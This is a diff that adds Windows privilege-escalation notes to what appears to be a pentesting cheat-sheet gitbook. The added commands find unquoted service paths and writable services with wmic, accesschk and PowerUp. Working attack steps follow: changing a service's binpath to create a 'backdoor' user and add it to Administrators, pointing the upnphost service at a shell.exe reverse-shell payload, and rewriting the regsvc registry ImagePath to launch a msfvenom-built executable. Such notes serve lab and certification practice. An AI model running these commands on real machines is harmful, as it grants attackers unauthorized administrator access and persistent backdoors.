@@ -148,3 +148,91 @@ C:\Program Files.exe
 C:\Program Files(x86)\Program Folder\A.exe
 ```
 
+### To discover unquoted service path
+
+```c
+# With WMIC
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
+
+# With powershell/PowerUp
+Get-ServiceUnquoted  
+```
+
+## Writable Path \(accesschk.exe &gt; upnphost\)
+
+\(1\) Accesschk for any writable path  
+\(2\) sc qc to query   
+\(3\) method1: adding backdoor user to admin group  
+\(4\) method2: adding binary payload 
+
+```c
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
+accesschk.exe -qdws Users C:\Windows\ /accepteula
+
+# Or 
+
+accesschk.exe -wuvc daclsvc /accepteula
+```
+
+![](../.gitbook/assets/image%20%2819%29.png)
+
+### Querying Service 
+
+```c
+# With powershell/PowerUp
+Get-ModifiableServiceFile
+Get-ModifiableService
+Get-ServiceDetail
+
+# Querying service
+sc qc <vuln-service>
+```
+
+### Method 1: Adding backdoor user to admin group
+
+```c
+sc qc <vuln-service>
+sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
+sc stop <vuln-service>
+sc start <vuln-service>
+
+sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
+sc stop <vuln-service>
+sc start <vuln-service>
+```
+
+### Method 2: Adding binary payload
+
+```c
+sc config upnphost binpath= "C:\Inetpub\ftproot\shell.exe"sc config upnphost obj= ".\LocalSystem" password= ""sc config upnphost depend= ""
+sc stop upnphost
+
+# run reverse shell listener
+
+net start upnphost
+```
+
+## Services Registry
+
+```c
+# In Powershell
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+
+# Cmd
+powershell "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl"
+
+```
+
+![](../.gitbook/assets/image%20%2829%29.png)
+
+Create exploit eg. Msfvenom exploit.exe and place in writable folder like 'temp'
+
+```c
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\exploit.exe /f
+```
+
+Run service `sc start regsvc`
+
+
+
